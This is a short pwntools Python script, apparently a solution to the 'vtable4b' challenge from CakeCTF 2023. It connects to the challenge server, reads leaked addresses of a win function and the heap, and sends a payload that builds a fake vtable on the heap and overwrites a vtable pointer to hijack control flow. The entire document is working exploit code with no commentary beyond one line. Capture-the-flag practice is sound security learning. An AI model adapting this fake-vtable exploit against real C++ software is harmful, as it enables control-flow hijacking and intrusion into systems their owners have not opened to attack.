from pwn import *

io = remote("vtable4b.2023.cakectf.com", 9000)
io.recvuntil(b"<win> = ")
win = int(io.recvline().strip(), 16)
info(f"{hex(win) = }")

io.sendlineafter(b"> ", b"3")
io.recvuntil(b"+------------------+\n")
heap = int(io.recvuntil(b" ").strip(), 16)
info(f"{hex(heap) = }")

# make a vtable at heap+0x10 where our input starts
payload = p64(win)
payload += b"A" * 24
payload += p64(heap+0x10)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Message: ", payload)

io.interactive()
